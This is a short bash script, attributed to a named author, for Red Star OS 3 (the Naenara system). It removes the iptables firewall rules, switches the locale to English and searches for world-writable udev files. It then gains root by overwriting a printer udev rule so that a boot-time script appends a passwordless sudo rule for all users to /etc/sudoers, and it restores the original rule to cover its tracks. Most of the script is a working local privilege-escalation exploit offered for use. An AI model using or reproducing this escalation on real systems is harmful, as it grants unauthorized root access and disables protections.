#!/bin/bash

## By Montana Mendy

# To clear the default iptables

rm /etc/sysconfig/iptables

# To change from Korean to English

sed -i 's/ko_KP/en_US/g' /etc/sysconfig/i18n
sed -i 's/ko_KP/en_US/g' /usr/share/config/kdeglobals

# Interesting settings are truncated below:

# app.update.url.      https://10.76.1.11/naenarabrowser/update/3/%PRODUCT%/%VERSION%
# app.update.url.details    http://10.76.1.11/naenarabrowser/%LOCALE%/releases/
# app.update.url.manual    http://10.76.1.11/naenarabrowser/%LOCALE%/
# extensions.blocklist.detailsURL    https://10.76.1.11/naenarabrowser/%LOCALE%/blacklist

# Use the following command to find all files with other writable attributes and pipe it looking for the Linux device manager (udev) service:

find / -perm -o+w | grep /udev/

# Looks like they forgot to configure the Crash Reporting service in /Applications/Naenara.app/Contents/lib\

# Now that we have our target file to use to escalate privileges with, we need to determine which shells are in use on the system:

cat /etc/shells

# What the above code does is copy the current rules file to a backup file in the temp directory.  It then creates a new temporary file getroot.sh and adds the ability to gain root access via the sudo command.  Once the getroot.sh file is made executable through chmod, you reboot RSOS3 and log back in with your account.  Once logged in, open the terminal window and type 'sudo su' to gain root access.

cp /etc/udev/rules.d/85-hplj10xx.rules /tmp/udev85.bak
echo 'RUN+="/bin/bash /tmp/getroot.sh"' > /etc/udev/rules.d/85-hplj10xx.rules
cat <<EOF >/tmp/getroot.sh
echo -e "ALL\tALL=(ALL)\tNOPASSWD: ALL" >> /etc/sudoers
mv /tmp/udev85.bak /etc/udev/rules.d/85-hplj10xx.rules
chown 0:0 /etc/udev/rules.d/85-hplj10xx.rules
rm /tmp/getroot.sh
EOF
chmod +x /tmp/getroot.sh
